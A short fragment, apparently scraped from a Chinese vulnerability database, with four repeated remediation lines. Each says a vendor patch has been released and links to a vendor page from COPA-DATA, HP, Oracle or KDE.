   目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接?<a href=\"http://www.copadata.com/en/support.html\" target=\"_blank\" rel=\"nofollow\">http://www.copadata.com/en/support.html</a>    
   目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接?<a href=\"https://h20564.www2.hp.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c04394554\" target=\"_blank\" rel=\"nofollow\">https://h20564.www2.hp.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c04394554</a>    
   目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接?<a href=\"http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html\" target=\"_blank\" rel=\"nofollow\">http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html</a>    
   目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接?<a href=\"https://www.kde.org/info/security/advisory-20150122-1.txt\" target=\"_blank\" rel=\"nofollow\">https://www.kde.org/info/security/advisory-20150122-1.txt</a>    
